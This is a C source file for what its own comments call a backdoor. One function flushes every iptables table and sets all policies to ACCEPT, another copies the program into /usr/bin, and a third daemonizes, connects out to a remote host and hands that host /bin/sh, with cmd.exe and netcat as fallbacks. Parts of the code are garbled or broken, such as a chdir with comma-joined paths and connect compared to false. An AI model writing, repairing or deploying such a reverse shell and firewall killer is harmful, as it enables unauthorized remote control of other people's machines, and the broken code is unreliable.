#include "execfuncs.h"
#include "main.h"

int kill_frwl()

{

    system("iptables -X 2> /dev/null");
    system("iptables -F 2> /dev/null");
    system("iptables -t nat -F 2> /dev/null");
    system("iptables -t nat -X 2> /dev/null");
    system("iptables -t mangle -F 2> /dev/null");
    system("iptables -t mangle -X 2> /dev/null");
    system("iptables -P INPUT ACCEPT 2> /dev/null");
    system("iptables -P FORWARD ACCEPT 2> /dev/null");
    system("iptables -P OUTPUT ACCEPT 2> /dev/null");

return 0;

}

int auto_copy()

{

    char *args[] = {"/bin/cp", "-t", "/usr/bin", __progname, 0};

    execve(args[0], &args[0], 0);

    free(args[0]);

   return 0;



}

int shell()

  {


 XFreeCursor;

 pid_t pid;
       pid = fork();

     if(pid < 0)
     exit(EXIT_FAILURE);


     if(pid > 0)
     exit(EXIT_SUCCESS);

  if(setsid() < 0)
     exit(EXIT_FAILURE);

  signal(SIGCHLD, SIG_IGN);
  signal(SIGHUP, SIG_IGN);


     pid = fork();


     if (pid < 0)
            exit (EXIT_FAILURE);

     if (pid > 0)
            exit(EXIT_SUCCESS);


      sigmask(0);

      chdir("/, /etc, C:\\Windows\\System32\\");

      int l;

       for( l = sysconf(_SC_OPEN_MAX); l >= 0; l--)


 {
       close(l);

    struct sockaddr_in s;

    int x;
    int root, *ps;
    //char *cmd[] = "/bin/sh"
    char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
    char *cmd[] = { "/bin/sh", (char *)0 };


    /* setting up the connection */

     memset(s.sin_zero, '\0', sizeof s.sin_zero); /*aloca espaço de memória para o PIPE socket. */

     s.sin_family = AF_INET; /* família de protocolos */
     s.sin_addr.s_addr = inet_addr(remote_addr);
     s.sin_port = htons(remote_port);
    // malloc(sizeof(s)));

    x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */

    /* sleep(120);  if connection are slow... sleep for 60x2 sec untill made the connection
                   discomment this if u think necessary... */


    /* when connection arrives, i've got the backdoor control. */

     (connect(x, (struct sockaddr *)&s, sizeof(s)));
     if (connect == false)
     perror("socket(SOCKET_CONNECT)connect_failed");

    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
     perror("setsockopt(SO_REUSEADDR)failed");

     /* don't freeze the memory, dude */

     sleep(5); /* sleep for 5 sec */

     /*enter in a shell, finally */

    /* anyway, here are where the conditions come... */

    /* fck, now  i have power!

      made conditions here. */

     send(x,"\nConnection done!\n",18,0), send(x,"\nConnected in machine\n",22,0);
     if(connect == false)
     perror("BREAK CONNECTION,(failure)");
     else

    // ps = send(x,"\n#root > /n",7,0);
     /*fflush(stdout);  DON'T! */

     dup2(x, 0),dup2(x, 1),dup2(x, 2);
     root = execve("/bin/sh", cmd,  window),execve("C:\\windows\\System32\\cmd.exe ", cmd, window),execve("netcat", cmd, window);

     }




